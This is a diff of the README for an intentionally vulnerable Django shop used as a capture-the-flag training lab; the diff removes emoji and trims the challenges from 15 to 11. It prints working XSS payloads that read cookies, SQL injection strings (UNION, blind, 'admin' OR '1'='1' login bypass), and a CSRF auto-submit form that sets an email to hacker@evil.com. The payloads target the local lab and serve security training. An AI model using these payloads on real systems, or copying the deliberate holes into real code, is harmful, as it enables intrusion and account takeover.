@@ -1,17 +1,17 @@
-# Helmaand 🛍️
+# Helmaand
 
-**CTF e-Commerce Platform** — a Django 6.0 clothing/apparel storefront with **intentionally vulnerable** endpoints for security training and capture-the-flag exercises.
+**CTF e-Commerce Platform** -- a Django 6.0 clothing/apparel storefront with **intentionally vulnerable** endpoints for security training and capture-the-flag exercises.
 
 Built with:
-- 🐍 Python 3.12+
-- 🌐 Django 6.0.7
-- 🗄️ SQLite (default database)
-- 🖼️ Pillow (image handling)
-- 🎨 Django Templates + Bootstrap 5
+- Python 3.12+
+- Django 6.0.7
+- SQLite (default database)
+- Pillow (image handling)
+- Django Templates + Bootstrap 5
 
 ---
 
-## 📦 Project Structure
+## Project Structure
 
 ```
 Helmaand/
@@ -30,29 +30,25 @@ Helmaand/
 
 ---
 
-## 🔓 CTF Challenges
+## CTF Challenges
 
-**15 challenges** across three vulnerability categories, at easy-to-intermediate difficulty. Visit the **Security Lab** page (`/lab/`) for hints, objectives, and flag hints.
+**11 challenges** across three vulnerability categories, at easy-to-intermediate difficulty. Visit the **Security Lab** page (`/lab/`) for hints, objectives, and flag hints.
 
 All flags use the format **`HLMD{...}`**.
 
-### XSS Challenges (5)
+### XSS Challenges (3)
 
 | # | Challenge | Difficulty | Endpoint | Flag Cookie |
 |---|-----------|------------|----------|-------------|
 | 1 | Stored XSS | Easy | `/product/<slug>/` | `ctf_xss_stored` |
 | 2 | Reflected XSS | Easy | `/track/?id=` | `ctf_xss_reflected` |
 | 3 | DOM-based XSS | Intermediate | `/gallery/#` (hash) | `ctf_xss_dom` |
-| 4 | Attribute XSS | Intermediate | `/newsletter/?name=` | `ctf_xss_attribute` |
-| 5 | Self-XSS | Easy | `/accounts/profile/` | `ctf_xss_self` |
 
 **How to test:**
 
-1. **Stored XSS** — Post a review on any product page with `<img src=x onerror="alert(document.cookie)">`. The comment renders with `\|safe`. Reload to execute. Read the `ctf_xss_stored` cookie.
-2. **Reflected XSS** — Visit `/track/?id=<script>alert(document.cookie)</script>`. The `?id=` value renders with `\|safe`. Read the `ctf_xss_reflected` cookie.
-3. **DOM-based XSS** — Visit `/gallery/#<img src=x onerror="alert(document.cookie)">`. Client-side JS writes `location.hash` into `innerHTML`. Read the `ctf_xss_dom` cookie.
-4. **Attribute XSS** — Visit `/newsletter/?name=" onmouseover="alert(document.cookie)`. Breaks out of the HTML attribute. Trigger the event handler. Read the `ctf_xss_attribute` cookie.
-5. **Self-XSS** — Register with a username containing `<img src=x onerror="alert(document.cookie)">`, then visit your profile. The username renders with `\|safe`. Read the `ctf_xss_self` cookie.
+1. **Stored XSS** -- Post a review on any product page with `<img src=x onerror="alert(document.cookie)">`. The comment renders with `|safe`. Reload to execute. Read the `ctf_xss_stored` cookie.
+2. **Reflected XSS** -- Visit `/track/?id=<script>alert(document.cookie)</script>`. The `?id=` value renders with `|safe`. Read the `ctf_xss_reflected` cookie.
+3. **DOM-based XSS** -- Visit `/gallery/#<img src=x onerror="alert(document.cookie)">`. Client-side JS writes `location.hash` into `innerHTML`. Read the `ctf_xss_dom` cookie.
 
 ---
 
@@ -60,68 +56,64 @@ All flags use the format **`HLMD{...}`**.
 
 | # | Challenge | Difficulty | Endpoint | Flag Location |
 |---|-----------|------------|----------|---------------|
-| 6 | UNION-based SQLi | Intermediate | `/search/?q=` | Hidden product (`is_active=0`) |
-| 7 | Error-based SQLi | Intermediate | `/filter/?sort=` | `security_ctfflag` table |
-| 8 | Blind Boolean SQLi | Intermediate | `/stock/?id=` | `security_ctfflag` table |
-| 9 | Time-based Blind SQLi | Intermediate | `/promo/?code=` | `security_ctfflag` table |
-| 10 | Auth Bypass SQLi | Easy | `/staff-login/` | Success message |
+| 4 | UNION-based SQLi | Intermediate | `/search/?q=` | Hidden product (`is_active=0`) |
+| 5 | Error-based SQLi | Intermediate | `/filter/?sort=` | `security_ctfflag` table |
+| 6 | Blind Boolean SQLi | Intermediate | `/stock/?id=` | `security_ctfflag` table |
+| 7 | Time-based Blind SQLi | Intermediate | `/promo/?code=` | `security_ctfflag` table |
+| 8 | Auth Bypass SQLi | Easy | `/staff-login/` | Success message |
 
 **How to test:**
 
-6. **UNION SQLi** — The search runs `SELECT * FROM shop_product WHERE is_active=1 AND name LIKE '%{q}%'`. Craft a UNION payload to exfiltrate the hidden product:
+4. **UNION SQLi** -- The search runs `SELECT * FROM shop_product WHERE is_active=1 AND name LIKE '%{q}%'`. Craft a UNION payload to exfiltrate the hidden product:
    ```
    x' UNION SELECT id,name,slug,brand,description,price,discount_price,stock,size,color,is_active,created_at,updated_at,category_id FROM shop_product WHERE is_active=0 --
    ```
-7. **Error SQLi** — The filter passes `?sort=` directly into `ORDER BY`. Try `?sort=extractvalue` or any invalid column — the raw DB error is reflected back, leaking schema info for further extraction.
-8. **Blind SQLi** — The stock checker runs `SELECT stock FROM shop_product WHERE id = {id} AND is_active = 1`. Only "In Stock"/"Out of Stock" is returned. Use boolean conditions:
+5. **Error SQLi** -- The filter passes `?sort=` directly into `ORDER BY`. Try `?sort=extractvalue` or any invalid column -- the raw DB error is reflected back, leaking schema info for further extraction.
+6. **Blind SQLi** -- The stock checker runs `SELECT stock FROM shop_product WHERE id = {id} AND is_active = 1`. Only "In Stock"/"Out of Stock" is returned. Use boolean conditions:
    ```
    ?id=1 AND (SELECT substr(flag,1,1)='H' FROM security_ctfflag WHERE challenge_id='sqli_blind') --
    ```
-9. **Time-based SQLi** — The promo validator runs `SELECT 1 FROM shop_promo WHERE code='{code}'`. Only "Valid"/"Invalid" is returned. Use a time-delay payload (SQLite: `randomblob`; MySQL: `SLEEP`) and measure response time.
-10. **Auth Bypass SQLi** — The staff login builds `SELECT * FROM auth_user WHERE username='{username}' AND password='{password}' AND is_staff=1`. Bypass with:
-    ```
-    username: admin' OR '1'='1      password: anything
-    ```
+7. **Time-based SQLi** -- The promo validator runs `SELECT 1 FROM shop_promo WHERE code='{code}'`. Only "Valid"/"Invalid" is returned. Use a time-delay payload (SQLite: `randomblob`; MySQL: `SLEEP`) and measure response time.
+8. **Auth Bypass SQLi** -- The staff login builds `SELECT * FROM auth_user WHERE username='{username}' AND password='{password}' AND is_staff=1`. Bypass with:
+   ```
+   username: admin' OR '1'='1      password: anything
+   ```
 
 ---
 
-### CSRF Challenges (5)
+### CSRF Challenges (3)
 
 | # | Challenge | Difficulty | Endpoint | Method |
 |---|-----------|------------|----------|--------|
-| 11 | CSRF via POST | Intermediate | `/accounts/change-email/` | POST |
-| 12 | CSRF via GET | Easy | `/accounts/reset-preferences/` | GET |
-| 13 | Login CSRF | Intermediate | `/accounts/quick-login/` | POST |
-| 14 | Logout CSRF | Easy | `/accounts/force-logout/` | GET |
-| 15 | Password Change CSRF | Intermediate | `/accounts/change-password/` | POST |
+| 9 | CSRF via POST | Intermediate | `/accounts/change-email/` | POST |
+| 10 | CSRF via GET | Easy | `/accounts/reset-preferences/` | GET |
+| 11 | Password Change CSRF | Intermediate | `/accounts/change-password/` | POST |
 
 **How to test:**
 
-11. **CSRF POST** — The change-email view is `@csrf_exempt` with no CSRF token. Build an auto-submitting form on another origin:
-    ```html
-    <html><body onload="document.forms[0].submit()">
-      <form action="http://127.0.0.1:8000/accounts/change-email/" method="POST">
-        <input type="hidden" name="email" value="hacker@evil.com">
-      </form>
-    </body></html>
-    ```
-12. **CSRF GET** — The reset-preferences endpoint performs a state change via plain GET. Embed `<img src="http://127.0.0.1:8000/accounts/reset-preferences/">` on any page.
-13. **Login CSRF** — The quick-login endpoint is `@csrf_exempt`. For a cross-site login, POST the attacker's credentials to `/accounts/quick-login/` from another origin.
-14. **Logout CSRF** — The force-logout endpoint logs out via plain GET. Embed `<img src="http://127.0.0.1:8000/accounts/force-logout/">` on any page.
-15. **Password Change CSRF** — The change-password view is `@csrf_exempt` and accepts the new password via POST. Forge a cross-site POST with `new_password=<known_value>`.
+9. **CSRF POST** -- The change-email view is `@csrf_exempt` with no CSRF token. Build an auto-submitting form on another origin:
+   ```html
+   <html><body onload="document.forms[0].submit()">
+     <form action="http://127.0.0.1:8000/accounts/change-email/" method="POST">
+       <input type="hidden" name="email" value="hacker@evil.com">
+     </form>
+   </body></html>
+   ```
+10. **CSRF GET** -- The reset-preferences endpoint performs a state change via plain GET. Embed `<img src="http://127.0.0.1:8000/accounts/reset-preferences/">` on any page.
+11. **Password Change CSRF** -- The change-password view is `@csrf_exempt` and accepts the new password via POST. Forge a cross-site POST with `new_password=<known_value>`.
 
 ---
 
-## 🚀 Run Locally — Step by Step
+## Run Locally -- Step by Step
 
-### Step 1 — Clone the repository
+### Step 1 -- Clone the repository
 
 ```bash
 git clone https://github.com/lipon101/Helmaand.git
 cd Helmaand
 ```
 
-### Step 2 — Create and activate a virtual environment
+### Step 2 -- Create and activate a virtual environment
 
 **Linux / macOS:**
 ```bash
@@ -135,20 +127,20 @@ python -m venv venv
 venv\Scripts\Activate.ps1
 ```
 
-### Step 3 — Install dependencies
+### Step 3 -- Install dependencies
 
 ```bash
 pip install --upgrade pip
 pip install -r requirements.txt
 ```
 
-### Step 4 — Apply database migrations
+### Step 4 -- Apply database migrations
 
 ```bash
 python manage.py migrate
 ```
 
-### Step 5 — Seed demo data (products, hidden flags, CTF flags, promo codes, sample XSS review)
+### Step 5 -- Seed demo data (products, hidden flags, CTF flags, promo codes, sample XSS review)
 
 ```bash
 python manage.py seed_data
@@ -159,16 +151,16 @@ This creates:
 - **Test user:** `demo` / `demo123`
 - 6 demo products + 1 hidden flag product (`is_active=0`)
 - 3 promo codes (`SUMMER25`, `WELCOME10`, `VIP50`)
-- 15 CTF flags seeded into the `security_ctfflag` table
+- 11 CTF flags seeded into the `security_ctfflag` table
 - A sample stored-XSS review on the Luxury Leather Jacket
 
-### Step 6 — (Optional) Collect static files
+### Step 6 -- (Optional) Collect static files
 
 ```bash
 python manage.py collectstatic
 ```
 
-### Step 7 — Run the development server
+### Step 7 -- Run the development server
 
 ```bash
 python manage.py runserver
@@ -178,18 +170,18 @@ Open your browser:
 
 | Page              | URL                                |
 |-------------------|------------------------------------|
-| 🏠 Home           | http://127.0.0.1:8000/             |
-| 🛒 Shop Catalog   | http://127.0.0.1:8000/shop/       |
-| 🔍 Search (SQLi)  | http://127.0.0.1:8000/search/     |
-| 🔬 Security Lab   | http://127.0.0.1:8000/lab/        |
-| 👤 Login          | http://127.0.0.1:8000/accounts/login/ |
-| 📝 Register       | http://127.0.0.1:8000/accounts/register/ |
-| 📊 Dashboard      | http://127.0.0.1:8000/dashboard/  |
-| ⚙️ Django Admin   | http://127.0.0.1:8000/admin/      |
+| Home              | http://127.0.0.1:8000/             |
+| Shop Catalog      | http://127.0.0.1:8000/shop/       |
+| Search (SQLi)     | http://127.0.0.1:8000/search/     |
+| Security Lab      | http://127.0.0.1:8000/lab/        |
+| Login             | http://127.0.0.1:8000/accounts/login/ |
+| Register          | http://127.0.0.1:8000/accounts/register/ |
+| Dashboard         | http://127.0.0.1:8000/dashboard/  |
+| Django Admin      | http://127.0.0.1:8000/admin/      |
 
 ---
 
-## 🧪 Useful Management Commands
+## Useful Management Commands
 
 ```bash
 python manage.py check              # Check for issues
@@ -201,7 +193,7 @@ python manage.py shell               # Interactive Django shell
 
 ---
 
-## ⚙️ Configuration
+## Configuration
 
 Settings live in `perfect/settings.py`. Key environment variables:
 
@@ -214,14 +206,14 @@ Settings live in `perfect/settings.py`. Key environment variables:
 
 ---
 
-## 🌐 Deploy on Render
+## Deploy on Render
 
 This project ships with a [`render.yaml`](render.yaml) Blueprint for one-click deploys, plus a [`Procfile`](Procfile) and [`runtime.txt`](runtime.txt).
 
-### Quick start (Blueprint — recommended)
+### Quick start (Blueprint -- recommended)
 
 1. Push your code to GitHub (repo root should contain `manage.py`).
-2. On [Render](https://dashboard.render.com/), click **New → Blueprint** and select this repo.
+2. On [Render](https://dashboard.render.com/), click **New -> Blueprint** and select this repo.
 3. Render reads `render.yaml` and auto-configures the web service. Adjust the service name if you like.
 4. Set the hostname you'll receive (e.g. `helmaand.onrender.com`) in two env vars before the first deploy:
    - `DJANGO_ALLOWED_HOSTS=your-service.onrender.com`
@@ -230,7 +222,7 @@ This project ships with a [`render.yaml`](render.yaml) Blueprint for one-click d
 
 ### Manual setup (Web Service)
 
-1. On Render, click **New → Web Service** and connect the repo.
+1. On Render, click **New -> Web Service** and connect the repo.
 2. **Runtime:** Python 3 (Render reads `runtime.txt`).
 3. **Build Command:**
    ```bash
@@ -251,11 +243,11 @@ This project ships with a [`render.yaml`](render.yaml) Blueprint for one-click d
    | `DJANGO_ALLOWED_HOSTS` | `your-service.onrender.com` | Comma-separated |
    | `DJANGO_CSRF_TRUSTED_ORIGINS` | `https://your-service.onrender.com` | Needed for POST forms over HTTPS |
 
-> ⚠️ Render free-tier instances use an ephemeral disk. The bundled SQLite DB resets on every deploy/restart. For persistent CTF data, attach a Render Postgres database and update `DATABASES` in `settings.py`, or accept the reseed on each cold start (the build command runs `seed_data` automatically).
+> Render free-tier instances use an ephemeral disk. The bundled SQLite DB resets on every deploy/restart. For persistent CTF data, attach a Render Postgres database and update `DATABASES` in `settings.py`, or accept the reseed on each cold start (the build command runs `seed_data` automatically).
 
 ---
 
-## 🔐 Test Credentials
+## Test Credentials
 
 After running `seed_data`:
 
@@ -266,14 +258,14 @@ After running `seed_data`:
 
 ---
 
-## 📝 Notes
+## Notes
 
-- This project is an **intentionally vulnerable CTF platform** — do not use in production.
-- SQLite is used by default — fine for development and CTF demos.
+- This project is an **intentionally vulnerable CTF platform** -- do not use in production.
+- SQLite is used by default -- fine for development and CTF demos.
 - Cart operations, order checkout, and payment logic are scaffolded but not fully implemented.
 
 ---
 
-## 📄 License
+## License
 
 This project is provided as-is for educational/CTF purposes.
